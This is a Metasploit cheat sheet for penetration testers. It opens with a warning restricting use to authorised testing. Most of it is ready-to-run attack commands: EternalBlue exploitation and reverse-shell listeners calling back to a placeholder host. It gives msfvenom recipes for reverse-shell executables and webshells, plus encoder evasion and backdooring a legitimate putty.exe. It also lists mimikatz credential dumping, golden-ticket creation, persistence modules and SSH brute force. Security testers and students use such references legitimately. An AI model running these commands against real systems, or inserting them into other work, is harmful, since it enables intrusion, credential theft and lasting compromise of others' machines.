---
title: "Metasploit"
description: "Metasploit Framework commands for msfconsole navigation, exploit execution, payload generation, post-exploitation, and meterpreter operations."
icon: "🎯"
weight: 14
count: 60
tags: ["metasploit", "pentesting", "exploitation", "security"]
---

{{< callout type="warning" >}}
Metasploit is for **authorised penetration testing, CTF competitions, and security research only**. Use only on systems you have explicit written permission to test.
{{< /callout >}}

## msfconsole Basics

```bash
msfconsole
msfconsole -q                                # quiet mode (no banner)
msfconsole -x "use exploit/multi/handler; run"  # run commands on start
msfdb init                                   # initialise database
msfdb start
msfdb status
```

## Navigation & Search

```bash
help
help <command>
search <keyword>
search type:exploit platform:windows smb
search type:auxiliary scanner
search cve:2017-0144
search name:eternalblue
use <module>                                 # e.g. use exploit/windows/smb/ms17_010_eternalblue
use 0                                        # use result by search index number
back                                         # exit current module
info                                         # show module info
info <module>
show options
show advanced
show payloads
show targets
show missing                                 # show required options not set
```

## Module Options

```bash
set RHOSTS 192.168.1.10
set RHOSTS 192.168.1.0/24
set RHOSTS file:/tmp/targets.txt
set RPORT 445
set LHOST 10.10.10.10
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set TARGET 0
set VERBOSE true
setg LHOST 10.10.10.10                      # set globally for session
unset RHOSTS
unset all
```

## Running Modules

```bash
run
run -j                                       # run as background job
exploit
exploit -j
exploit -z                                   # run and background session
check                                        # check if target is vulnerable (if supported)
jobs                                         # list background jobs
jobs -K                                      # kill all jobs
kill <job-id>
```

## Sessions

```bash
sessions
sessions -l                                  # list sessions
sessions -i <id>                             # interact with session
sessions -k <id>                             # kill session
sessions -K                                  # kill all sessions
sessions -u <id>                             # upgrade shell to meterpreter
sessions -B <id>                             # background session
```

## Payloads

```bash
show payloads
grep meterpreter show payloads
grep windows/x64 show payloads

# Common payloads
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_https
windows/x64/shell_reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x64/shell_reverse_tcp
java/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
```

## Multi/Handler (Listener)

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set ExitOnSession false                      # keep listener open
run -j                                       # run in background
```

## Meterpreter — System

```bash
sysinfo
getuid
getpid
getsystem                                    # attempt privilege escalation
getprivs
ps                                           # list processes
migrate <pid>                               # migrate to process
migrate -N explorer.exe                     # migrate by name
kill <pid>
shell                                        # drop to OS shell
exit
```

## Meterpreter — File System

```bash
pwd
ls
cd <path>
cat <file>
upload /local/file /remote/path
download /remote/file /local/path
edit <file>
mkdir <dir>
rm <file>
rmdir <dir>
search -f *.txt
search -f *.kdbx -d C:\\
```

## Meterpreter — Networking

```bash
ipconfig
ifconfig
arp
netstat
route
portfwd add -l 3389 -p 3389 -r 192.168.1.10  # port forward
portfwd list
portfwd delete -l 3389
```

## Meterpreter — Pivoting

```bash
# Add route through session
route add 192.168.2.0/24 <session-id>
route print
route flush

# SOCKS proxy via session
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
# Then configure proxychains to use 127.0.0.1:1080
```

## Meterpreter — Credential Harvesting

```bash
hashdump                                     # dump local SAM hashes
run post/windows/gather/hashdump
run post/windows/gather/smart_hashdump
run post/multi/gather/ssh_creds
run post/windows/gather/credentials/credential_collector
load kiwi                                    # load mimikatz
creds_all                                    # dump all credentials
lsa_dump_sam
lsa_dump_secrets
golden_ticket_create -d domain -u user -s SID -k krbtgt_hash -t ticket.kirbi
```

## Meterpreter — Persistence

```bash
run post/windows/manage/persistence_exe
run post/windows/manage/schtasks
run exploit/windows/local/persistence
```

## Meterpreter — Pivoting & Recon

```bash
run post/multi/recon/local_exploit_suggester    # suggest local exploits
run post/windows/gather/enum_shares
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_domain
run post/windows/gather/enum_applications
run post/windows/gather/enum_services
run post/windows/gather/screen_spy
run post/multi/manage/shell_to_meterpreter
```

## MSFvenom

```bash
# List formats and payloads
msfvenom -l payloads
msfvenom -l formats
msfvenom -l encoders

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf

# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > shell.dll

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py

# With encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > encoded.exe

# Inject into existing executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -x /usr/share/windows-resources/putty.exe -k -f exe > putty_backdoor.exe
```

## Auxiliary Modules

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389

# SMB scanner
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares

# SSH scanner
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/robots_txt

# Credentials
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mssql/mssql_login
```

## Database

```bash
db_status
workspace                                    # list workspaces
workspace -a <name>                          # create workspace
workspace <name>                             # switch workspace
hosts                                        # list discovered hosts
hosts -R                                     # set RHOSTS from hosts table
services                                     # list discovered services
services -p 445                             # filter by port
vulns                                        # list found vulnerabilities
creds                                        # list credentials
loot                                         # list collected loot
db_nmap -sV 192.168.1.0/24                 # run nmap and import results
db_import scan.xml                           # import nmap XML
db_export -f xml output.xml                 # export database
```
